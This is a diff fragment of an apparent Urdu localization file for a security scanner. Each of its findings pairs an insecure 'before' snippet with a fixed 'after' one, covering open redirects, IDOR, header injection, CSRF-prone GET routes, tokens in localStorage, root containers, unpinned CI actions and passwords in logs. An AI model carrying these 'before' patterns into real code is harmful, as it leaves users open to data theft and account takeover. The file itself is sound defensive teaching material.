+      "ایک storage bucket (Supabase Storage، S3) عوامی کے طور پر configure کیا گیا ہے۔ اگر اس میں صارفین کی اپ لوڈ کردہ documents، تصاویر یا فائلیں ہوں، تو جو بھی اس کا path جانتا ہو — یا اندازہ لگا لے — بغیر authentication کے اس تک رسائی حاصل کر سکتا ہے۔",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// فائلیں وقت کے ساتھ محدود signed URLs سے فراہم کریں: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "ڈیٹا ڈیلیٹ یا تبدیل کرنے کے لیے صرف ایک link کافی ہے",
+    description:
+      "ایک GET route ایسا آپریشن کرتا ہے جو ڈیٹا بدل دیتا ہے (path میں delete/remove/update/edit شامل ہے)۔ GET درخواستیں صرف کسی link پر جانے یا کسی بیرونی سائٹ سے تصویر لوڈ ہونے پر بھی چل جاتی ہیں — یہ CSRF حملے کا کلاسک نقطہ آغاز ہے۔",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "براؤزر میں محفوظ کیے گئے لاگ ان ڈیٹا اچھی طرح محفوظ نہیں ہیں",
+    description:
+      "ایک access token localStorage میں محفوظ کیا جاتا ہے۔ httpOnly cookie کے برعکس، صفحے میں چلنے والا کوئی بھی script (بشمول XSS کے ذریعے injected کوئی بدنیت script) اسے پڑھ کر چرا سکتا ہے۔",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// سرور سے ٹوکن کو httpOnly cookie کے طور پر سیٹ کریں:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "سائٹ کسی فراڈ سائٹ کی طرف redirect کرنے کے لیے استعمال ہو سکتی ہے",
+    description:
+      "سائٹ صارف کو درخواست سے براہ راست لیے گئے ایک پتے (query، body، params) کی طرف redirect کرتی ہے، یہ چیک کیے بغیر کہ وہ کوئی معروف domain ہے۔ کوئی link جو آپ کی سائٹ کی طرف جاتا دکھائی دے، دراصل کسی phishing صفحے تک لے جا سکتا ہے۔",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "پتے میں کوئی نمبر بدل کر دوسروں کا ڈیٹا نظر آ سکتا ہے",
+    description:
+      "ڈیٹا بیس کی ایک query URL سے لیا گیا identifier (req.params.id) براہ راست استعمال کرتی ہے، قریبی سطور میں یہ تصدیق کیے بغیر کہ وہ درخواست کرنے والے صارف کا ہی ہے۔ پتے میں id بدل کر کسی دوسرے صارف کے ڈیٹا تک رسائی ممکن ہو سکتی ہے — Insecure Direct Object Reference۔",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "header-injection": {
+    title: "درخواست کی کوئی قدر براہ راست HTTP جواب کے header میں چلی جاتی ہے",
+    description:
+      "HTTP جواب کا ایک header درخواست سے براہ راست لی گئی قدر (query، body، params) سے سیٹ کیا جاتا ہے، یہ چیک کیے بغیر کہ اس میں line break (CRLF) شامل نہیں۔ کوئی حملہ آور اضافی headers یا یہاں تک کہ مکمل طور پر مختلف response شامل کر سکتا ہے — response splitting — جس سے cache، cookies یا دوسرے صارفین کو دکھایا جانے والا مواد تبدیل کیا جا سکتا ہے۔",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "docker-missing-user": {
+    title: "Dockerfile کوئی non-root صارف سیٹ نہیں کرتا",
+    description:
+      "Dockerfile میں کوئی USER instruction موجود نہیں: اسے متعین کیے بغیر container root کے طور پر چلتا ہے۔ اگر کوئی حملہ آور container کے اندر کوڈ چلانے میں کامیاب ہو جائے (مثلاً کسی vulnerable لائبریری کا فائدہ اٹھا کر)، تو container کے اندر root ہونا host کی طرف ممکنہ فرار یا ارد گرد کے سسٹم پر زیادہ وسیع اثر کو آسان بنا دیتا ہے۔",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Kubernetes manifest واضح طور پر non-root صارف کے طور پر چلنے کو نافذ نہیں کرتا",
+    description:
+      'manifest میں کہیں بھی "runAsNonRoot" موجود نہیں (نہ pod کی سطح پر نہ کسی انفرادی container کی): اسے سیٹ کیے بغیر، container اسی صارف کے طور پر چلتا ہے جو اس کی image میں متعین ہو — اکثر default طور پر root، اگر image نے خود یہ نہ بدلا ہو۔ اسے واضح طور پر true پر سیٹ کرنا pod کے آغاز کو ناکام بنا دیتا ہے اگر image اب بھی root کے طور پر چلنے کی کوشش کرے، بجائے اس کے کہ یہ بات کسی واقعے کے بعد ہی معلوم ہو۔',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "CI میں third-party action کسی مخصوص ورژن (commit SHA) پر pin نہیں ہے",
+    description:
+      'یہ workflow ایک third-party action tag یا branch کے حوالے سے استعمال کرتا ہے (مثلاً "@v1"، "@main")، commit SHA کے بجائے۔ جو اسے maintain کرے — یا جو اس کا اکاؤنٹ compromise کرے — وہ کسی بھی وقت اس reference کو کسی مختلف commit پر منتقل کر سکتا ہے، خاموشی سے CI میں چلنے والی چیز بدل سکتا ہے، اس کے رازوں تک رسائی کے ساتھ۔ ایک commit SHA ہمیشہ بالکل اسی کوڈ کی طرف اشارہ کرتا ہے۔',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1، commit SHA پر pin کی گئی — ورژن اپ ڈیٹ کرتے وقت SHA بھی اپ ڈیٹ کریں`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "Workflow صرف استعمال ہونے والے permissions کے بجائے ٹوکن کے تمام permissions خود کو دے دیتا ہے",
+    description:
+      '"permissions: write-all" workflow کے GITHUB_TOKEN کو ہر چیز پر write رسائی دیتا ہے — issues، pull requests، packages، deployments — چاہے workflow ان میں سے صرف کچھ ہی استعمال کرے۔ اگر workflow کا کوئی step compromise ہو جائے (کوئی بدنیت dependency، کوئی injected script)، تو یہ وسیع permissions اس کا فائدہ اٹھانے والے کی طاقت بڑھا دیتے ہیں۔',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # صرف وہ permissions جو workflow واقعی استعمال کرتا ہے`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "session یا authentication کوکی Secure اور HttpOnly flags کے بغیر سیٹ کی گئی ہے",
+    description:
+      'session/authentication/token جیسے نام والی ایک کوکی اپنے options میں "httpOnly" اور "secure" کے بغیر سیٹ کی گئی ہے۔ httpOnly کے بغیر، صفحے کا کوئی بھی JavaScript — بشمول XSS کے ذریعے injected کوڈ — وہ کوکی پڑھ سکتا ہے۔ secure کے بغیر، یہ کسی غیر encrypted HTTP کنکشن پر بھی بھیجی جا سکتی ہے۔',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "لاگ ان فارم لگاتار بہت سی کوششوں کو نہیں روکتا",
+    description:
+      "فائل میں ایک login route متعین ہے، لیکن اسی فائل میں rate limiting middleware کا کوئی نشان نہیں۔ کوششوں کی کوئی حد نہ ہونے کی وجہ سے، حملہ آور بغیر روکے لگاتار پاس ورڈز آزما سکتا ہے (brute force)۔",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "پاس ورڈز یا حساس ڈیٹا logs میں چلے جاتے ہیں",
+    description:
+      "console.log (یا اس جیسی) کی ایک call میں password، token، secret یا apiKey نامی کوئی variable شامل ہے۔ اگر یہ logs کسی بیرونی سروس یا فائل میں چلے جائیں، تو حساس ڈیٹا ضرورت سے کہیں زیادہ دیر تک صاف الفاظ میں رہتا ہے۔",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'Dockerfile کی base image ":latest" ٹیگ استعمال کرتی ہے',
+    description:
+      '"ایک FROM instruction واضح طور پر کسی مخصوص ورژن کے بجائے ":latest" ٹیگ استعمال کرتی ہے۔ "latest" وقت کے ساتھ بدلتا رہتا ہے: وہی build کسی اور وقت دوبارہ کرنے پر base image کا مختلف ورژن مل سکتا ہے — ایک non-reproducible build، اور کوئی ناپسندیدہ اپ ڈیٹ بغیر کسی کے فیصلے کے آ سکتی ہے۔',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfile COPY کے بجائے ADD سے کوئی remote فائل ڈاؤن لوڈ کرتا ہے",
+    description:
+      "http/https URL والی ADD instruction build کے دوران انٹرنیٹ سے ایک فائل ڈاؤن لوڈ کرتی ہے، بغیر integrity کی تصدیق کے اور بغیر اس کے کہ مواد ریپوزٹری میں نظر آئے۔ اگر وہ URL مستقبل میں compromise ہو جائے، تو build من چاہا مواد شامل کر لیتی ہے، بغیر اس کے کہ Dockerfile پڑھتے ہوئے کسی کو پتا چلے۔",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<متوقع hash>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "کمزور Dependency:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "ابھی تک کوئی درست ورژن معلوم نہیں — کسی متبادل package پر غور کریں یا پراجیکٹ کے اپ ڈیٹس دیکھتے رہیں۔"
+      ),
+    },
+  }),
+},
 };
